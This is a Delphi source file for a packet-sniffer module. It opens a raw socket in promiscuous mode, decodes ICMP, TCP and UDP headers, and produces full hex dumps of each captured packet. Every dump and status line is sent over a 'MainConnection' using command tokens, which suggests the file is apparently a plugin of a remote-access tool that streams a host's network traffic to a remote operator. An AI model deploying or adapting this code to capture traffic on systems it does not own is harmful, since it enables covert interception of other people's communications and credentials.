unit UnitPortSniffer;

interface

uses
  Windows, WinSock, UnitThread, UnitVariables, UnitConstants, UnitFunctions,
  UnitCommands, SysUtils;

const
  MAX_PACKET_SIZE = $10000;
  
type
  TSnifferThread = class(TThread)
  private
    WSA: TWSAData;
    hSocket: TSocket;
    Addr_in: sockaddr_in;
    Packet: array[0..MAX_PACKET_SIZE - 1] of Byte;
    TotalPacketCount: Integer;
    LogDatas: string;
    procedure SendLogDatas;
  protected
    function InitSocket: Boolean; virtual;
    procedure DeInitSocket(const ExitCode: Integer); virtual;
    procedure Execute; override;
    procedure ParsePacket(const PacketSize: Word); virtual;
  public
    hInterface: string;
    constructor Create(CreateSuspended: Boolean = True);  
  end;

var
  SnifferThread: TSnifferThread;

function InterfacesList: string;

implementation

{$I Tcp_Ip_Header.inc}

const
  SIO_RCVALL = $98000001;
  WSA_VER = $202;
  MAX_ADAPTER_NAME_LENGTH        = 256;
  MAX_ADAPTER_DESCRIPTION_LENGTH = 128;
  MAX_ADAPTER_ADDRESS_LENGTH     = 8;
  IPHelper = 'iphlpapi.dll';
  ICMP_ECHO             = 8;
  ICMP_ECHOREPLY        = 0;

resourcestring
  LOG_STR_0 = '==============================================================================' + #13#10;
  LOG_STR_1 = 'Packet ID: %-5d TTL: %d' + #13#10;
  LOG_STR_2 = 'Packet size: %-5d bytes type: %s' + #13#10;
  LOG_STR_3 = 'Source IP      : %15s: %d' + #13#10;
  LOG_STR_4 = 'Destination IP : %15s: %d' + #13#10;
  LOG_STR_5 = 'ARP Type: %s, operation: %s' + #13#10;
  LOG_STR_6 = 'ICMP Type: %s' + #13#10;
  LOG_STR_7 = '------------------------------ Packet dump -----------------------------------' + #13#10;

type
  TUDPHeader = packed record
    sourcePort:       Word;
    destinationPort:  Word;
    len:              Word;
    checksum:         Word;
  end;
  PUDPHeader = ^TUDPHeader;

  TICMPHeader = packed record
   IcmpType      : Byte;
   IcmpCode      : Byte;
   IcmpChecksum  : Word;
   IcmpId        : Word;
   IcmpSeq       : Word;
   IcmpTimestamp : DWORD;
  end;
  PICMPHeader = ^TICMPHeader;

  IP_ADDRESS_STRING = record
    S: array [0..15] of Char;
  end;
  IP_MASK_STRING = IP_ADDRESS_STRING;
  PIP_MASK_STRING = ^IP_MASK_STRING;

  PIP_ADDR_STRING = ^IP_ADDR_STRING;
  IP_ADDR_STRING = record
    Next: PIP_ADDR_STRING;
    IpAddress: IP_ADDRESS_STRING;
    IpMask: IP_MASK_STRING;
    Context: DWORD;
  end;

  PIP_ADAPTER_INFO = ^IP_ADAPTER_INFO;
  IP_ADAPTER_INFO = record
    Next: PIP_ADAPTER_INFO;
    ComboIndex: DWORD;
    AdapterName: array [0..MAX_ADAPTER_NAME_LENGTH + 3] of Char;
    Description: array [0..MAX_ADAPTER_DESCRIPTION_LENGTH + 3] of Char;
    AddressLength: UINT;
    Address: array [0..MAX_ADAPTER_ADDRESS_LENGTH - 1] of BYTE;
    Index: DWORD;
    Type_: UINT;
    DhcpEnabled: UINT;
    CurrentIpAddress: PIP_ADDR_STRING;
    IpAddressList: IP_ADDR_STRING;
    GatewayList: IP_ADDR_STRING;
    DhcpServer: IP_ADDR_STRING;
    HaveWins: BOOL;
    PrimaryWinsServer: IP_ADDR_STRING;
    SecondaryWinsServer: IP_ADDR_STRING;
    LeaseObtained: LongInt;
    LeaseExpires: LongInt;
  end;                   

  function GetAdaptersInfo(pAdapterInfo: PIP_ADAPTER_INFO;
    var pOutBufLen: DWORD): DWORD; stdcall; external IPHelper;
  
const
  IPHeaderSize = SizeOf(TIPHdr);
  ICMPHeaderSize = SizeOf(TICMPHeader);
  TCPHeaderSize = SizeOf(TTCPHdr);
  UDPHeaderSize = SizeOf(TUDPHeader);

constructor TSnifferThread.Create(CreateSuspended: Boolean);
begin
  inherited Create(CreateSuspended);
	FreeOnTerminate := True;
  TotalPacketCount := 0;
end;

procedure TSnifferThread.SendLogDatas;
begin
  MainConnection.SendDatas(PORTSNIFFER + '|' + PORTSNIFFERRESULTS + '|' + LogDatas);
end;

function TSnifferThread.InitSocket: Boolean;
var
  PromiscuousMode: Integer;
begin
  LogDatas := '[*] Initializing WinSock...' + #13#10;
  Synchronize(SendLogDatas);
  Sleep(500);

  Result := WSAStartup(WSA_VER, WSA) = NOERROR;
  if not Result then
  begin
    LogDatas := '[-] Failed to initialize Winsock' + #13#10;
    Synchronize(SendLogDatas);
    Exit;
  end;

  LogDatas := '[*] Creating RAW socket...' + #13#10;
  Synchronize(SendLogDatas);
  Sleep(500);

  hSocket := socket(AF_INET, SOCK_RAW, IPPROTO_IP);
  if hSocket = INVALID_SOCKET then
  begin                     
    LogDatas := '[-] Failed to create RAW socket' + #13#10;
    Synchronize(SendLogDatas);
    DeInitSocket(WSAGetLastError);
    Exit;
  end;

  FillChar(Addr_in, SizeOf(sockaddr_in), 0);
  Addr_in.sin_family:= AF_INET;
  Addr_in.sin_addr.s_addr := inet_addr(PChar(hInterface));

  LogDatas := '[*] Binding RAW socket...' + #13#10;
  Synchronize(SendLogDatas);
  Sleep(500);

  if bind(hSocket, Addr_in, SizeOf(sockaddr_in)) <> 0 then
  begin
    LogDatas := '[-] Failed to bind RAW socket' + #13#10;
    Synchronize(SendLogDatas);
    DeInitSocket(WSAGetLastError);
    Exit;
  end;

  LogDatas := '[*] Setting promiscuous mode...' + #13#10;
  Synchronize(SendLogDatas);
  Sleep(500);

  PromiscuousMode := 1;
  if ioctlsocket(hSocket, SIO_RCVALL, PromiscuousMode) <> 0 then
  begin
    LogDatas := '[-] Failed to set promiscuous mode' + #13#10;
    Synchronize(SendLogDatas);
    DeInitSocket(WSAGetLastError);
    Exit;
  end;

  LogDatas := '[*] Sniffing started on interface: ' + hInterface + #13#10#13#10;
  Synchronize(SendLogDatas);
  Sleep(500);

  Result := True;
end;

procedure TSnifferThread.DeInitSocket(const ExitCode: Integer);
begin
  if ExitCode = 0 then Exit;
  if hSocket <> INVALID_SOCKET then closesocket(hSocket);
  WSACleanup;
end;
          
procedure TSnifferThread.ParsePacket(const PacketSize: Word);
var
  IPHeader: TIPHdr;
  ICMPHeader: TICMPHeader;
  TCPHeader: TTCPHdr;
  UDPHeader: TUDPHeader;
  SrcPort, DestPort: Word;
  I, Octets, PartOctets: Integer;
  PacketType, DumpData, ExtendedInfo: String;
  Addr, A, B: TInAddr;
  TmpStr: string;
begin
  Inc(TotalPacketCount);
  Move(Packet[0], IPHeader, IPHeaderSize);
  TmpStr := LOG_STR_0 + Format(LOG_STR_1, [TotalPacketCount, IPHeader.ip_ttl]);
  SrcPort := 0;
  DestPort := 0;
  ExtendedInfo := '';
  case IPHeader.ip_p of
    IPPROTO_ICMP: // ICMP
    begin
      PacketType := 'ICMP';
      Move(Packet[IPHeaderSize], ICMPHeader, ICMPHeaderSize);
      case ICMPHeader.IcmpCode of
        ICMP_ECHO: ExtendedInfo := Format(LOG_STR_6, ['Echo']);
        ICMP_ECHOREPLY: ExtendedInfo := Format(LOG_STR_6, ['Echo reply']);
      else
        ExtendedInfo := Format(LOG_STR_6, ['Unknown']);
      end;
    end;
    IPPROTO_TCP: // TCP
    begin
      PacketType := 'TCP';
      Move(Packet[IPHeaderSize], TCPHeader, TCPHeaderSize);
      SrcPort := TCPHeader.tcp_src;
      DestPort := TCPHeader.tcp_dst;
    end;
    IPPROTO_UDP: // UDP
    begin
      PacketType := 'UDP';
      Move(Packet[IPHeaderSize], UDPHeader, UDPHeaderSize);
      SrcPort := UDPHeader.sourcePort;
      DestPort := UDPHeader.destinationPort;
    end;
  else
    PacketType := 'Unsupported (0x' + IntToHex(IPHeader.ip_p, 2) + ')';
  end;
  
  TmpStr := TmpStr + Format(LOG_STR_2, [PacketSize, PacketType]);
  if ExtendedInfo <> '' then TmpStr := TmpStr + ExtendedInfo;
  Addr.S_addr := IPHeader.ip_src;
  TmpStr := TmpStr + Format(LOG_STR_3, [inet_ntoa(Addr), SrcPort]);
  Addr.S_addr := IPHeader.ip_dst;
  TmpStr := TmpStr + Format(LOG_STR_4, [inet_ntoa(Addr), DestPort]) + LOG_STR_7;

  I := 0;
  Octets := 0;
  PartOctets := 0;
  while I < PacketSize do
  begin
    case PartOctets of
      0: TmpStr := TmpStr + Format('%.6d ', [Octets]);
      9: TmpStr := TmpStr + '| ';
      18:
      begin
        Inc(Octets, 10);
        PartOctets := -1;
        TmpStr := TmpStr + '    ' + DumpData + #13#10;
        DumpData := '';
      end;
    else
      begin
        TmpStr := TmpStr + Format('%s ', [IntToHex(Packet[I], 2)]);
        if Packet[I] in [$19..$7F] then DumpData := DumpData + Chr(Packet[I]) else
          DumpData := DumpData + '.';
        Inc(I);
      end;
    end;
    Inc(PartOctets);
  end;

  if PartOctets = 0 then TmpStr := TmpStr + #13#10#13#10 else
  begin
    PartOctets := (16 - Length(DumpData)) * 3;
    if PartOctets >= 24 then Inc(PartOctets, 2);
    Inc(PartOctets, 4);
    TmpStr := TmpStr + StringOfChar(' ', PartOctets) + DumpData + #13#10#13#10
  end;

  LogDatas := TmpStr;
  Synchronize(SendLogDatas);
end;

procedure TSnifferThread.Execute;
var
  PacketSize: Integer;
begin
  if InitSocket then
  try
    while not Terminated do
    begin
      ProcessMessages;
      PacketSize := recv(hSocket, Packet, MAX_PACKET_SIZE, 0);
      if PacketSize > SizeOf(TIPHdr) then ParsePacket(PacketSize);
    end;
  finally
    DeInitSocket(NO_ERROR);
  end;
end;
     
function InterfacesList: string;
var
  InterfaceInfo, TmpPointer: PIP_ADAPTER_INFO;
  IP: PIP_ADDR_STRING;
  Len: DWORD;
begin
  if GetAdaptersInfo(nil, Len) = ERROR_BUFFER_OVERFLOW then
  begin
    GetMem(InterfaceInfo, Len);
    try
      if GetAdaptersInfo(InterfaceInfo, Len) = ERROR_SUCCESS then
      begin
        TmpPointer := InterfaceInfo;
        repeat
          IP := @TmpPointer.IpAddressList;
          repeat
            Result := Result + Format('%s - [%s]', [IP^.IpAddress.S, TmpPointer.Description]) + '|';
            IP := IP.Next;
          until IP = nil;

          TmpPointer := TmpPointer.Next;
        until TmpPointer = nil;
      end;
    finally
      FreeMem(InterfaceInfo);
    end;
  end;
end;

end.
